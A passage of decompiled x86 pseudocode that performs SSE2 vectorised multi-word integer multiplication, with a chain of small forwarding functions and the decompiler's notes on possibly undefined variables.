  v68 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v65), 0x10u), _mm_move_epi64(v66));
  v69 = _mm_unpackhi_epi64(v66, v63);
  *(_QWORD *)(v67 + 26) = v68.m128i_i64[0];
  v70 = _mm_add_epi32(_mm_unpackhi_epi64(v65, v63), _mm_srli_epi64(v68, 0x30u));
  v71 = _mm_load_si128(&v325);
  v72 = _mm_mul_epu32(_mm_load_si128(&v307), v71);
  v74 = _mm_mul_epu32(v71, *v73);
  v75 = _mm_load_si128(&stru_46C990);
  v76 = _mm_add_epi32(v70, _mm_and_si128(v75, v72));
  v77 = _mm_add_epi32(v69, _mm_srli_epi32(v72, 0x10u));
  v78 = _mm_and_si128(v75, v74);
  v79 = _mm_srli_epi32(v74, 0x10u);
  sub_416692();
  v80 = _mm_move_epi64(v78);
  v81 = _mm_move_epi64(v79);
  v82 = _mm_add_epi32(v76, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v78, v80), v80), 4));
  v83 = _mm_add_epi32(v77, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v79, v81), v81), 4));
  *(_DWORD *)(v84 + 32) = _mm_cvtsi128_si32(v82);
  v85 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v82), 0x10u), _mm_move_epi64(v83));
  v86 = _mm_unpackhi_epi64(v83, v80);
  *(_QWORD *)(v84 + 34) = v85.m128i_i64[0];
  v87 = _mm_add_epi32(_mm_unpackhi_epi64(v82, v80), _mm_srli_epi64(v85, 0x30u));
  v89 = _mm_load_si128(&v325);
  v90 = _mm_mul_epu32(_mm_load_si128(&v308), v89);
  v91 = _mm_mul_epu32(v89, v88[1]);
  v92 = _mm_load_si128(&stru_46C990);
  v93 = _mm_add_epi32(v87, _mm_and_si128(v92, v90));
  v94 = _mm_add_epi32(v86, _mm_srli_epi32(v90, 0x10u));
  v95 = _mm_and_si128(v92, v91);
  v96 = _mm_srli_epi32(v91, 0x10u);
  sub_416655();
  v97 = _mm_move_epi64(v95);
  v98 = _mm_move_epi64(v96);
  v99 = _mm_add_epi32(v93, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v95, v97), v97), 4));
  v100 = _mm_add_epi32(v94, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v96, v98), v98), 4));
  *(_DWORD *)(v101 + 40) = _mm_cvtsi128_si32(v99);
  v102 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v99), 0x10u), _mm_move_epi64(v100));
  v103 = _mm_unpackhi_epi64(v100, v97);
  *(_QWORD *)(v101 + 42) = v102.m128i_i64[0];
  v104 = _mm_add_epi32(_mm_unpackhi_epi64(v99, v97), _mm_srli_epi64(v102, 0x30u));
  v105 = _mm_load_si128(&v326);
  v106 = _mm_mul_epu32(_mm_load_si128(&v308), v105);
  v108 = _mm_mul_epu32(v105, *v107);
  v109 = _mm_load_si128(&stru_46C990);
  v110 = _mm_add_epi32(v104, _mm_and_si128(v109, v106));
  v111 = _mm_add_epi32(v103, _mm_srli_epi32(v106, 0x10u));
  v112 = _mm_and_si128(v109, v108);
  v113 = _mm_srli_epi32(v108, 0x10u);
  sub_416618();
  v114 = _mm_move_epi64(v112);
  v115 = _mm_move_epi64(v113);
  v116 = _mm_add_epi32(v110, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v112, v114), v114), 4));
  v117 = _mm_add_epi32(v111, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v113, v115), v115), 4));
  *(_DWORD *)(v118 + 48) = _mm_cvtsi128_si32(v116);
  v119 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v116), 0x10u), _mm_move_epi64(v117));
  v120 = _mm_unpackhi_epi64(v117, v114);
  *(_QWORD *)(v118 + 50) = v119.m128i_i64[0];
  v121 = _mm_add_epi32(_mm_unpackhi_epi64(v116, v114), _mm_srli_epi64(v119, 0x30u));
  v123 = _mm_load_si128(&v326);
  v124 = _mm_mul_epu32(_mm_load_si128(&v309), v123);
  v125 = _mm_mul_epu32(v123, v122[1]);
  v126 = _mm_load_si128(&stru_46C990);
  v127 = _mm_add_epi32(v121, _mm_and_si128(v126, v124));
  v128 = _mm_add_epi32(v120, _mm_srli_epi32(v124, 0x10u));
  v129 = _mm_and_si128(v126, v125);
  v130 = _mm_srli_epi32(v125, 0x10u);
  sub_4165DB();
  v131 = _mm_move_epi64(v129);
  v132 = _mm_move_epi64(v130);
  v133 = _mm_add_epi32(v127, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v129, v131), v131), 4));
  v134 = _mm_add_epi32(v128, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v130, v132), v132), 4));
  *(_DWORD *)(v135 + 56) = _mm_cvtsi128_si32(v133);
  v136 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v133), 0x10u), _mm_move_epi64(v134));
  v137 = _mm_unpackhi_epi64(v134, v131);
  *(_QWORD *)(v135 + 58) = v136.m128i_i64[0];
  v138 = _mm_add_epi32(_mm_unpackhi_epi64(v133, v131), _mm_srli_epi64(v136, 0x30u));
  v139 = _mm_load_si128(&v327);
  v140 = _mm_mul_epu32(_mm_load_si128(&v309), v139);
  v142 = _mm_mul_epu32(v139, *v141);
  v143 = _mm_load_si128(&stru_46C990);
  v144 = _mm_add_epi32(v138, _mm_and_si128(v143, v140));
  v145 = _mm_add_epi32(v137, _mm_srli_epi32(v140, 0x10u));
  v146 = _mm_and_si128(v143, v142);
  v147 = _mm_srli_epi32(v142, 0x10u);
  sub_41659E();
  v148 = _mm_move_epi64(v146);
  v149 = _mm_move_epi64(v147);
  v150 = _mm_add_epi32(v144, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v146, v148), v148), 4));
  v151 = _mm_add_epi32(v145, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v147, v149), v149), 4));
  *(_DWORD *)(v152 + 64) = _mm_cvtsi128_si32(v150);
  v153 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v150), 0x10u), _mm_move_epi64(v151));
  v154 = _mm_unpackhi_epi64(v151, v148);
  *(_QWORD *)(v152 + 66) = v153.m128i_i64[0];
  v155 = _mm_add_epi32(_mm_unpackhi_epi64(v150, v148), _mm_srli_epi64(v153, 0x30u));
  v157 = _mm_load_si128(&v327);
  v158 = _mm_mul_epu32(_mm_load_si128(&v310), v157);
  v159 = _mm_mul_epu32(v157, v156[1]);
  v160 = _mm_load_si128(&stru_46C990);
  v161 = _mm_add_epi32(v155, _mm_and_si128(v160, v158));
  v162 = _mm_add_epi32(v154, _mm_srli_epi32(v158, 0x10u));
  v163 = _mm_and_si128(v160, v159);
  v164 = _mm_srli_epi32(v159, 0x10u);
  sub_416561();
  v165 = _mm_move_epi64(v163);
  v166 = _mm_move_epi64(v164);
  v167 = _mm_add_epi32(v161, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v163, v165), v165), 4));
  v168 = _mm_add_epi32(v162, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v164, v166), v166), 4));
  *(_DWORD *)(v169 + 72) = _mm_cvtsi128_si32(v167);
  v170 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v167), 0x10u), _mm_move_epi64(v168));
  v171 = _mm_unpackhi_epi64(v168, v165);
  *(_QWORD *)(v169 + 74) = v170.m128i_i64[0];
  v172 = _mm_add_epi32(_mm_unpackhi_epi64(v167, v165), _mm_srli_epi64(v170, 0x30u));
  v173 = _mm_load_si128(&v328);
  v174 = _mm_mul_epu32(_mm_load_si128(&v310), v173);
  v176 = _mm_mul_epu32(v173, *v175);
  v177 = _mm_load_si128(&stru_46C990);
  v178 = _mm_add_epi32(v172, _mm_and_si128(v177, v174));
  v179 = _mm_add_epi32(v171, _mm_srli_epi32(v174, 0x10u));
  v180 = _mm_and_si128(v177, v176);
  v181 = _mm_srli_epi32(v176, 0x10u);
  sub_416524();
  v182 = _mm_move_epi64(v180);
  v183 = _mm_move_epi64(v181);
  v184 = _mm_add_epi32(v178, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v180, v182), v182), 4));
  v185 = _mm_add_epi32(v179, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v181, v183), v183), 4));
  *(_DWORD *)(v186 + 80) = _mm_cvtsi128_si32(v184);
  v187 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v184), 0x10u), _mm_move_epi64(v185));
  v188 = _mm_unpackhi_epi64(v185, v182);
  *(_QWORD *)(v186 + 82) = v187.m128i_i64[0];
  v189 = _mm_add_epi32(_mm_unpackhi_epi64(v184, v182), _mm_srli_epi64(v187, 0x30u));
  v191 = _mm_load_si128(&v328);
  v192 = _mm_mul_epu32(_mm_load_si128(&v311), v191);
  v193 = _mm_mul_epu32(v191, v190[1]);
  v194 = _mm_load_si128(&stru_46C990);
  v195 = _mm_add_epi32(v189, _mm_and_si128(v194, v192));
  v196 = _mm_add_epi32(v188, _mm_srli_epi32(v192, 0x10u));
  v197 = _mm_and_si128(v194, v193);
  v198 = _mm_srli_epi32(v193, 0x10u);
  sub_4164E7();
  v199 = _mm_move_epi64(v197);
  v200 = _mm_move_epi64(v198);
  v201 = _mm_add_epi32(v195, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v197, v199), v199), 4));
  v202 = _mm_add_epi32(v196, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v198, v200), v200), 4));
  *(_DWORD *)(v203 + 88) = _mm_cvtsi128_si32(v201);
  v204 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v201), 0x10u), _mm_move_epi64(v202));
  v205 = _mm_unpackhi_epi64(v202, v199);
  *(_QWORD *)(v203 + 90) = v204.m128i_i64[0];
  v206 = _mm_add_epi32(_mm_unpackhi_epi64(v201, v199), _mm_srli_epi64(v204, 0x30u));
  v207 = _mm_load_si128(&v329);
  v208 = _mm_mul_epu32(_mm_load_si128(&v311), v207);
  v210 = _mm_mul_epu32(v207, *v209);
  v211 = _mm_load_si128(&stru_46C990);
  v212 = _mm_add_epi32(v206, _mm_and_si128(v211, v208));
  v213 = _mm_add_epi32(v205, _mm_srli_epi32(v208, 0x10u));
  v214 = _mm_and_si128(v211, v210);
  v215 = _mm_srli_epi32(v210, 0x10u);
  sub_4164AA();
  v216 = _mm_move_epi64(v214);
  v217 = _mm_move_epi64(v215);
  v218 = _mm_add_epi32(v212, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v214, v216), v216), 4));
  v219 = _mm_add_epi32(v213, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v215, v217), v217), 4));
  *(_DWORD *)(v220 + 96) = _mm_cvtsi128_si32(v218);
  v221 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v218), 0x10u), _mm_move_epi64(v219));
  v222 = _mm_unpackhi_epi64(v219, v216);
  *(_QWORD *)(v220 + 98) = v221.m128i_i64[0];
  v223 = _mm_add_epi32(_mm_unpackhi_epi64(v218, v216), _mm_srli_epi64(v221, 0x30u));
  v225 = _mm_load_si128(&v329);
  v226 = _mm_mul_epu32(_mm_load_si128(&v312), v225);
  v227 = _mm_mul_epu32(v225, v224[1]);
  v228 = _mm_load_si128(&stru_46C990);
  v229 = _mm_add_epi32(v223, _mm_and_si128(v228, v226));
  v230 = _mm_add_epi32(v222, _mm_srli_epi32(v226, 0x10u));
  v231 = _mm_and_si128(v228, v227);
  v232 = _mm_srli_epi32(v227, 0x10u);
  sub_41646D();
  v233 = _mm_move_epi64(v231);
  v234 = _mm_move_epi64(v232);
  v235 = _mm_add_epi32(v229, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v231, v233), v233), 4));
  v236 = _mm_add_epi32(v230, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v232, v234), v234), 4));
  *(_DWORD *)(v237 + 104) = _mm_cvtsi128_si32(v235);
  v238 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v235), 0x10u), _mm_move_epi64(v236));
  v239 = _mm_unpackhi_epi64(v236, v233);
  *(_QWORD *)(v237 + 106) = v238.m128i_i64[0];
  v240 = _mm_add_epi32(_mm_unpackhi_epi64(v235, v233), _mm_srli_epi64(v238, 0x30u));
  v241 = _mm_load_si128(&v330);
  v242 = _mm_mul_epu32(_mm_load_si128(&v312), v241);
  v244 = _mm_mul_epu32(v241, *v243);
  v245 = _mm_load_si128(&stru_46C990);
  v246 = _mm_add_epi32(v240, _mm_and_si128(v245, v242));
  v247 = _mm_add_epi32(v239, _mm_srli_epi32(v242, 0x10u));
  v248 = _mm_and_si128(v245, v244);
  v249 = _mm_srli_epi32(v244, 0x10u);
  result = sub_416430();
  v251 = _mm_move_epi64(v248);
  v252 = _mm_move_epi64(v249);
  v253 = _mm_add_epi32(v246, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v248, v251), v251), 4));
  v254 = _mm_add_epi32(v247, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v249, v252), v252), 4));
  v255 = (__m128)_mm_move_epi64(v254);
  *(_DWORD *)(v256 + 112) = _mm_cvtsi128_si32(v253);
  v257 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v253), 0x10u), (__m128i)v255);
  *(_QWORD *)(v256 + 114) = v257.m128i_i64[0];
  v258 = _mm_add_epi32(_mm_unpackhi_epi64(v253, v251), _mm_srli_epi64(v257, 0x30u));
  ++v259;
  v260 = _mm_load_si128(&v330);
  v261 = _mm_load_si128(&v338);
  v262 = _mm_add_epi64(
           _mm_add_epi64(
             _mm_add_epi64(v258, _mm_mul_epu32(_mm_load_si128(&v313), v260)),
             _mm_slli_epi64(_mm_unpackhi_epi64(v254, v251), 0x10u)),
           _mm_mul_epu32(_mm_load_si128(&v305), v261));
  v263 = _mm_add_epi32(_mm_mul_epu32(v260, *v259), _mm_mul_epu32(v261, v259[-8]));
  v264 = _mm_load_si128(&v323);
  v265 = _mm_add_epi64(v262, _mm_mul_epu32(_mm_load_si128(&v320), v264));
  v266 = _mm_add_epi32(v263, _mm_mul_epu32(v264, v259[7]));
  v267 = _mm_load_si128(&v337);
  v268 = _mm_add_epi64(v265, _mm_mul_epu32(_mm_load_si128(&v306), v267));
  v269 = _mm_add_epi32(v266, _mm_mul_epu32(v267, v259[-7]));
  v270 = _mm_load_si128(&v324);
  v271 = _mm_add_epi64(v268, _mm_mul_epu32(_mm_load_si128(&v319), v270));
  v272 = _mm_add_epi32(v269, _mm_mul_epu32(v270, v259[6]));
  v273 = _mm_load_si128(&v336);
  v274 = _mm_add_epi64(v271, _mm_mul_epu32(_mm_load_si128(&v307), v273));
  v275 = _mm_add_epi32(v272, _mm_mul_epu32(v273, v259[-6]));
  v276 = _mm_load_si128(&v325);
  v277 = _mm_add_epi64(v274, _mm_mul_epu32(_mm_load_si128(&v318), v276));
  v278 = _mm_add_epi32(v275, _mm_mul_epu32(v276, v259[5]));
  v279 = _mm_load_si128(&v335);
  v280 = _mm_add_epi64(v277, _mm_mul_epu32(_mm_load_si128(&v308), v279));
  v281 = _mm_add_epi32(v278, _mm_mul_epu32(v279, v259[-5]));
  v282 = _mm_load_si128(&v326);
  v283 = _mm_add_epi64(v280, _mm_mul_epu32(_mm_load_si128(&v317), v282));
  v284 = _mm_add_epi32(v281, _mm_mul_epu32(v282, v259[4]));
  v285 = _mm_load_si128(&v334);
  v286 = _mm_add_epi64(v283, _mm_mul_epu32(_mm_load_si128(&v309), v285));
  v287 = _mm_add_epi32(v284, _mm_mul_epu32(v285, v259[-4]));
  v288 = _mm_load_si128(&v327);
  v289 = _mm_add_epi64(v286, _mm_mul_epu32(_mm_load_si128(&v316), v288));
  v290 = _mm_add_epi32(v287, _mm_mul_epu32(v288, v259[3]));
  v291 = _mm_load_si128(&v333);
  v292 = _mm_add_epi64(v289, _mm_mul_epu32(_mm_load_si128(&v310), v291));
  v293 = _mm_add_epi32(v290, _mm_mul_epu32(v291, v259[-3]));
  v294 = _mm_load_si128(&v328);
  v295 = _mm_add_epi64(v292, _mm_mul_epu32(_mm_load_si128(&v315), v294));
  v296 = _mm_add_epi32(v293, _mm_mul_epu32(v294, v259[2]));
  v297 = _mm_load_si128(&v332);
  v298 = _mm_add_epi64(v295, _mm_mul_epu32(_mm_load_si128(&v311), v297));
  v299 = _mm_add_epi32(v296, _mm_mul_epu32(v297, v259[-2]));
  v300 = _mm_load_si128(&v329);
  v301 = _mm_add_epi64(v298, _mm_mul_epu32(_mm_load_si128(&v314), v300));
  v302 = _mm_add_epi32(v299, _mm_mul_epu32(v300, v259[1]));
  v303 = _mm_load_si128(&v331);
  v304 = (__m128)_mm_add_epi32(v302, _mm_mul_epu32(v303, v259[-1]));
  *(_QWORD *)(v256 + 120) = _mm_add_epi32(
                              _mm_add_epi64(v301, _mm_mul_epu32(_mm_load_si128(&v312), v303)),
                              _mm_slli_epi64(_mm_add_epi32((__m128i)v304, (__m128i)_mm_movehl_ps(v255, v304)), 0x20u)).m128i_u64[0];
  return result;
}
// 41684B: variable 'v33' is possibly undefined
// 416882: variable 'v39' is possibly undefined
// 4168DB: variable 'v50' is possibly undefined
// 416902: variable 'v54' is possibly undefined
// 41696E: variable 'v67' is possibly undefined
// 4169A5: variable 'v73' is possibly undefined
// 4169FE: variable 'v84' is possibly undefined
// 416A25: variable 'v88' is possibly undefined
// 416A91: variable 'v101' is possibly undefined
// 416AC8: variable 'v107' is possibly undefined
// 416B21: variable 'v118' is possibly undefined
// 416B48: variable 'v122' is possibly undefined
// 416BB4: variable 'v135' is possibly undefined
// 416BEB: variable 'v141' is possibly undefined
// 416C44: variable 'v152' is possibly undefined
// 416C6B: variable 'v156' is possibly undefined
// 416CD7: variable 'v169' is possibly undefined
// 416D0E: variable 'v175' is possibly undefined
// 416D67: variable 'v186' is possibly undefined
// 416D8E: variable 'v190' is possibly undefined
// 416DFA: variable 'v203' is possibly undefined
// 416E31: variable 'v209' is possibly undefined
// 416E8A: variable 'v220' is possibly undefined
// 416EB1: variable 'v224' is possibly undefined
// 416F1D: variable 'v237' is possibly undefined
// 416F54: variable 'v243' is possibly undefined
// 416FAD: variable 'v256' is possibly undefined
// 416FD4: variable 'v259' is possibly undefined
// 46C990: using guessed type __m128i stru_46C990;
// 416370: using guessed type __m128i anonymous_27;

//----- (00416430) --------------------------------------------------------
int sub_416430()
{
  return sub_41646D();
}
// 41646D: using guessed type int sub_41646D(void);

//----- (0041646D) --------------------------------------------------------
int sub_41646D()
{
  return sub_4164AA();
}
// 4164AA: using guessed type int sub_4164AA(void);

//----- (004164AA) --------------------------------------------------------
int sub_4164AA()
{
  return sub_4164E7();
}
// 4164E7: using guessed type int sub_4164E7(void);

//----- (004164E7) --------------------------------------------------------
int sub_4164E7()
{
  return sub_416524();
}
// 416524: using guessed type int sub_416524(void);

//----- (00416524) --------------------------------------------------------
int sub_416524()
{
  return sub_416561();
}
// 416561: using guessed type int sub_416561(void);

//----- (00416561) --------------------------------------------------------
int sub_416561()
{
  return sub_41659E();
}
// 41659E: using guessed type int sub_41659E(void);

//----- (0041659E) --------------------------------------------------------
int sub_41659E()
{
  return sub_4165DB();
}
// 4165DB: using guessed type int sub_4165DB(void);

//----- (004165DB) --------------------------------------------------------
int sub_4165DB()
{
  return sub_416618();
}
// 416618: using guessed type int sub_416618(void);

//----- (00416618) --------------------------------------------------------
int sub_416618()
{
  return sub_416655();
}
// 416655: using guessed type int sub_416655(void);

//----- (00416655) --------------------------------------------------------
int sub_416655()
{
  return sub_416692();
}
// 416692: using guessed type int sub_416692(void);

//----- (00416692) --------------------------------------------------------
int sub_416692()
{
  return sub_4166CF();
}
// 4166CF: using guessed type int sub_4166CF(void);

//----- (004166CF) --------------------------------------------------------
int sub_4166CF()
{
  return sub_41670C();
}
// 41670C: using guessed type int sub_41670C(void);

//----- (0041670C) --------------------------------------------------------
int sub_41670C()
{
  return sub_416749();
}
// 416749: using guessed type int sub_416749(void);

//----- (00416749) --------------------------------------------------------
__m128i __usercall sub_416749@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>)
{
  return _mm_srli_epi32(_mm_mul_epu32(_mm_load_si128((const __m128i *)(a1 - 16)), _mm_load_si128(a2 + 1)), 0x10u);
}

//----- (004171A7) --------------------------------------------------------
int __cdecl sub_4171A7(int a1, int a2, int a3)
{
  int result; // eax
  int i; // edx
  __m128i v5; // xmm0
  __m128i v6; // xmm1
  __m128i v7; // xmm2
  __m128i v8; // xmm7
  __m128i v9; // xmm5
  __m128i si128; // xmm6
  __m128i v11; // xmm4
  __m128i v12; // xmm7
  __m128i v13; // xmm6
  __m128i v14; // xmm7
  __m128i v15; // xmm0
  __m128i v16; // xmm1
  __m128i v17; // xmm4
  __m128i v18; // xmm5
  __m128 v19; // xmm7
  __m128i v20; // xmm6
  __m128i v21; // xmm4
  __m128i v22; // xmm6
  __m128i v23; // xmm4
  __m128i v24; // xmm1
  __m128 v25; // xmm6
  int *v26; // [esp-4h] [ebp-80h] BYREF
  __m128i v27; // [esp+10h] [ebp-6Ch] BYREF
  __m128i v28; // [esp+20h] [ebp-5Ch] BYREF
  __m128i v29; // [esp+30h] [ebp-4Ch]
  __m128i v30; // [esp+40h] [ebp-3Ch]
  __m128i v31; // [esp+50h] [ebp-2Ch] BYREF
  __m128i v32; // [esp+60h] [ebp-1Ch] BYREF
  int v33; // [esp+70h] [ebp-Ch] BYREF

  result = a2;
  v26 = &v33;
  for ( i = 0; i != 16; i += 16 )
  {
    v5 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 216);
    v6 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 141);
    v7 = _mm_shuffle_epi32(*(__m128i *)(a3 + i), 216);
    *(__m128i *)((char *)&v27 + 2 * i) = v5;
    *(__m128i *)((char *)&v28 + 2 * i) = _mm_srli_epi64(v5, 0x20u);
    *(__m128i *)((char *)&v29 + 2 * i) = v6;
    *(__m128i *)((char *)&v30 + 2 * i) = _mm_srli_epi64(v6, 0x20u);
    *(__m128i *)((char *)&v31 + 2 * i) = v7;
    *(__m128i *)((char *)&v32 + 2 * i) = _mm_srli_epi64(v7, 0x20u);
  }
  v8 = _mm_load_si128(&v31);
  v9 = _mm_mul_epu32(_mm_load_si128(&v27), v8);
  si128 = _mm_load_si128(&stru_46C990);
  v11 = _mm_and_si128(si128, v9);
  v12 = _mm_mul_epu32(v8, v29);
  v13 = _mm_and_si128(si128, v12);
  v14 = _mm_srli_epi32(v12, 0x10u);
  v15 = _mm_move_epi64(v13);
  v16 = _mm_move_epi64(v14);
  v17 = _mm_add_epi32(v11, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v13, v15), v15), 4));
  v18 = _mm_add_epi32(_mm_srli_epi32(v9, 0x10u), _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v14, v16), v16), 4));
  v19 = (__m128)_mm_move_epi64(v18);
  *(_DWORD *)a1 = _mm_cvtsi128_si32(v17);
  v20 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v17), 0x10u), (__m128i)v19);
  *(_QWORD *)(a1 + 2) = v20.m128i_i64[0];
  v21 = _mm_add_epi32(_mm_unpackhi_epi64(v17, v15), _mm_srli_epi64(v20, 0x30u));
  v22 = _mm_load_si128(&v31);
  v23 = _mm_add_epi64(
          _mm_add_epi64(v21, _mm_mul_epu32(_mm_load_si128(&v28), v22)),
          _mm_slli_epi64(_mm_unpackhi_epi64(v18, v15), 0x10u));
  v24 = _mm_load_si128(&v32);
  v25 = (__m128)_mm_add_epi32(_mm_mul_epu32(v22, v30), _mm_mul_epu32(v24, v29));
  *(_QWORD *)(a1 + 8) = _mm_add_epi32(
                          _mm_add_epi64(v23, _mm_mul_epu32(_mm_load_si128((const __m128i *)(&v26 + 5)), v24)),
                          _mm_slli_epi64(_mm_add_epi32((__m128i)v25, (__m128i)_mm_movehl_ps(v19, v25)), 0x20u)).m128i_u64[0];
  return result;
}
// 46C990: using guessed type __m128i stru_46C990;

//----- (004172F8) --------------------------------------------------------
int __cdecl sub_4172F8(int a1, int a2, int a3)
{
  unsigned int i; // edx
  __m128i v4; // xmm0
  __m128i v5; // xmm1
  __m128i v6; // xmm2
  __m128i v7; // xmm7
  __m128i v8; // xmm5
  __m128i si128; // xmm6
  __m128i v10; // xmm4
  __m128i v11; // xmm7
  __m128i v12; // xmm6
  __m128i v13; // xmm7
  __m128i v14; // xmm0
  __m128i v15; // xmm1
  __m128i v16; // xmm4
  __m128i v17; // xmm5
  __m128i v18; // xmm6
  __m128i v19; // xmm5
  __m128i v20; // xmm4
  __m128i v21; // xmm7
  __m128i v22; // xmm0
  __m128i v23; // xmm7
  __m128i v24; // xmm6
  __m128i v25; // xmm4
  __m128i v26; // xmm5
  __m128i v27; // xmm6
  __m128i v28; // xmm7
  __m128i v29; // xmm0
  __m128i v30; // xmm1
  __m128i v31; // xmm4
  __m128i v32; // xmm5
  int v33; // ecx
  __m128i v34; // xmm6
  __m128i v35; // xmm5
  __m128i v36; // xmm4
  __m128i v37; // xmm7
  __m128i v38; // xmm0
  __m128i *v39; // edx
  __m128i v40; // xmm7
  __m128i v41; // xmm6
  __m128i v42; // xmm4
  __m128i v43; // xmm5
  __m128i v44; // xmm6
  __m128i v45; // xmm7
  int result; // eax
  __m128i v47; // xmm0
  __m128i v48; // xmm1
  __m128i v49; // xmm4
  __m128i v50; // xmm5
  __m128 v51; // xmm7
  int v52; // ecx
  __m128i v53; // xmm6
  __m128i v54; // xmm4
  __m128i *v55; // edx
  __m128i v56; // xmm6
  __m128i v57; // xmm1
  __m128i v58; // xmm4
  __m128i v59; // xmm6
  __m128i v60; // xmm1
  __m128i v61; // xmm4
  __m128i v62; // xmm6
  __m128i v63; // xmm1
  __m128 v64; // xmm6
  __m128i v65; // [esp+10h] [ebp-CCh] BYREF
  __m128i v66; // [esp+20h] [ebp-BCh] BYREF
  __m128i v67; // [esp+30h] [ebp-ACh] BYREF
  __m128i v68; // [esp+40h] [ebp-9Ch] BYREF
  __m128i v69; // [esp+50h] [ebp-8Ch]
  __m128i v70[3]; // [esp+60h] [ebp-7Ch]
  __m128i v71; // [esp+90h] [ebp-4Ch] BYREF
  __m128i v72; // [esp+A0h] [ebp-3Ch] BYREF
  __m128i v73; // [esp+B0h] [ebp-2Ch] BYREF
  __m128i v74; // [esp+C0h] [ebp-1Ch] BYREF

  for ( i = 0; i != 32; i += 16 )
  {
    v4 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 216);
    v5 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 141);
    v6 = _mm_shuffle_epi32(*(__m128i *)(a3 + i), 216);
    *(__m128i *)((char *)&v65 + 2 * i) = v4;
    *(__m128i *)((char *)&v66 + 2 * i) = _mm_srli_epi64(v4, 0x20u);
    *(__m128i *)((char *)&v69 + 2 * i) = v5;
    v70[i / 8] = _mm_srli_epi64(v5, 0x20u);
    *(__m128i *)((char *)&v71 + 2 * i) = v6;
    *(__m128i *)((char *)&v72 + 2 * i) = _mm_srli_epi64(v6, 0x20u);
  }
  v7 = _mm_load_si128(&v71);
  v8 = _mm_mul_epu32(_mm_load_si128(&v65), v7);
  si128 = _mm_load_si128(&stru_46C990);
  v10 = _mm_and_si128(si128, v8);
  v11 = _mm_mul_epu32(v7, v69);
  v12 = _mm_and_si128(si128, v11);
  v13 = _mm_srli_epi32(v11, 0x10u);
  v14 = _mm_move_epi64(v12);
  v15 = _mm_move_epi64(v13);
  v16 = _mm_add_epi32(v10, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v12, v14), v14), 4));
  v17 = _mm_add_epi32(_mm_srli_epi32(v8, 0x10u), _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v13, v15), v15), 4));
  *(_DWORD *)a1 = _mm_cvtsi128_si32(v16);
  v18 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v16), 0x10u), _mm_move_epi64(v17));
  v19 = _mm_unpackhi_epi64(v17, v14);
  *(_QWORD *)(a1 + 2) = v18.m128i_i64[0];
  v20 = _mm_add_epi32(_mm_unpackhi_epi64(v16, v14), _mm_srli_epi64(v18, 0x30u));
  v21 = _mm_load_si128(&v71);
  v22 = _mm_mul_epu32(_mm_load_si128(&v66), v21);
  v23 = _mm_mul_epu32(v21, v70[0]);
  v24 = _mm_load_si128(&stru_46C990);
  v25 = _mm_add_epi32(v20, _mm_and_si128(v24, v22));
  v26 = _mm_add_epi32(v19, _mm_srli_epi32(v22, 0x10u));
  v27 = _mm_and_si128(v24, v23);
  v28 = _mm_srli_epi32(v23, 0x10u);
  sub_4173E6((int)&v66, &v71);
  v29 = _mm_move_epi64(v27);
  v30 = _mm_move_epi64(v28);
  v31 = _mm_add_epi32(v25, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v27, v29), v29), 4));
  v32 = _mm_add_epi32(v26, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v28, v30), v30), 4));
  *(_DWORD *)(v33 + 8) = _mm_cvtsi128_si32(v31);
  v34 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v31), 0x10u), _mm_move_epi64(v32));
  v35 = _mm_unpackhi_epi64(v32, v29);
  *(_QWORD *)(v33 + 10) = v34.m128i_i64[0];
  v36 = _mm_add_epi32(_mm_unpackhi_epi64(v31, v29), _mm_srli_epi64(v34, 0x30u));
  v37 = _mm_load_si128(&v72);
  v38 = _mm_mul_epu32(_mm_load_si128(&v66), v37);
  v40 = _mm_mul_epu32(v37, *v39);
